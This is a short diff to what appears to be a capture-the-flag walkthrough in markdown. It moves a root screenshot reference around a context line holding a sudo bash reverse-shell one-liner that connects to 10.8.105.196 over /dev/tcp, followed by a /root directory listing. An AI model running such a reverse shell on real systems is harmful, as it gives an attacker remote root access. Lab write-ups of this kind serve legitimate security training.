@@ -118,6 +118,8 @@ Webpage:
 sudo bash -c 'exec bash -i &>/dev/tcp/10.8.105.196/12345 <&1'
 ```
 
+![root.png](images/root.png)
+
 Success!
 
 ```
@@ -135,8 +137,6 @@ drwx------  2 root root 4096 Feb 10  2019 .ssh
 -rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
 drwxr-xr-x  3 root root 4096 Feb 10  2019 snap
 ```
-
-![root.png](images/root.png)
 
 ## Spoiler alert
 
